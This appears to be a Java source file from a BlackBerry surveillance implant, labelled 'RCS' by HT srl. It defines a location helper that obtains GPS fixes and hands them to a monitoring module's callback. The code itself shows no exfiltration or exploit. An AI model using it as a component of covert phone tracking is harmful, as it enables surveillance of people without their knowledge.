//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.location;

import javax.microedition.location.Criteria;
import javax.microedition.location.Location;
import javax.microedition.location.LocationException;
import javax.microedition.location.LocationProvider;

import net.rim.device.api.system.Application;
import blackberry.Singleton;
import blackberry.config.Cfg;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.iSingleton;

public final class LocationHelper implements iSingleton {

    private long STOP_DELAY = 10 * 60 * 1000;
    //#ifdef DEBUG
    static Debug debug = new Debug("LocationHelper", DebugLevel.VERBOSE);
    //#endif

    private static LocationHelper instance;
    private static long GUID = 0xb6b1c761129a5249L;

    public synchronized static LocationHelper getInstance() {
        if (instance == null) {
            instance = (LocationHelper) Singleton.self().get(GUID);
            if (instance == null) {
                final LocationHelper singleton = new LocationHelper();
                Singleton.self().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    private LocationProvider lp;
    private Criteria criteria;

    private LocationHelper() {
        final Application application = Application.getApplication();

        criteria = new Criteria();
        criteria.setCostAllowed(true);

        criteria.setHorizontalAccuracy(Criteria.NO_REQUIREMENT);
        criteria.setVerticalAccuracy(Criteria.NO_REQUIREMENT);
        criteria.setPreferredPowerConsumption(Criteria.POWER_USAGE_HIGH);

    }

    public void start(final LocationObserver callback, boolean sync) {
        final Runnable closure = new Runnable() {
            public void run() {
                //#ifdef DEBUG
                Debug.init();
                //#endif

                //#ifdef DEBUG
                debug.trace("run LocationHelper");
                //#endif

                try {
                    lp = LocationProvider.getInstance(criteria);
                } catch (LocationException e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    debug.error("LocationHelper");
                    //#endif
                    callback.errorLocation(false);
                    return;
                }

                if (lp == null) {
                    //#ifdef DEBUG
                    debug.error("GPS Not Supported on Device");
                    //#endif       
                    callback.errorLocation(false);
                    return;
                }

                try {
                    callback.waitingForPoint(true);
                    int state = lp.getState();
                    if (state == LocationProvider.AVAILABLE) {
                        //#ifdef DEBUG
                        debug.trace("getLocation");
                        //#endif
                        final Location loc = lp.getLocation(Cfg.GPS_TIMEOUT);
                        callback.newLocation(loc);
                    } else if (state == LocationProvider.OUT_OF_SERVICE) {
                        //#ifdef DEBUG
                        debug.error("start, GPS not available, OUT_OF_SERVICE");
                        //#endif
                        lp.reset();
                        callback.errorLocation(false);
                    } else if (state == LocationProvider.TEMPORARILY_UNAVAILABLE) {
                        //#ifdef DEBUG
                        debug.error("start, GPS not available, TEMPORARILY_UNAVAILABLE");
                        //#endif
                        lp.reset();
                        callback.errorLocation(false);
                    }
                } catch (final LocationException e) {
                    if (e.getMessage() == "Timed out while waiting for GPS") {
                        //#ifdef DEBUG
                        debug.error(e.getMessage());
                        //#endif
                    } else {
                        //#ifdef DEBUG
                        debug.error(e);
                        //#endif
                    }
                    callback.errorLocation(false);
                } catch (final InterruptedException e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif
                    callback.errorLocation(true);
                } catch (Exception e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif
                } finally {
                    callback.waitingForPoint(false);
                }
                //#ifdef DEBUG
                debug.trace("run LocationHelper end");
                //#endif
            }

        };

        if (sync) {
            //#ifdef DEBUG
            debug.trace("start sync");
            //#endif
            closure.run();
        } else {
            //#ifdef DEBUG
            debug.trace("start async");
            //#endif
            //Status.self().getTimer().schedule(task,STOP_DELAY);            
            new Thread(closure).start();
        }

        //#ifdef DEBUG
        debug.trace("start ended");
        //#endif
    }

    public void stop(LocationObserver modulePosition) {
        //#ifdef DEBUG
        debug.trace("stop");
        //#endif
        if (lp != null) {
            lp.reset();
        }
    }

    public void reset() {
        if (lp != null) {
            lp.reset();
        }
    }
}
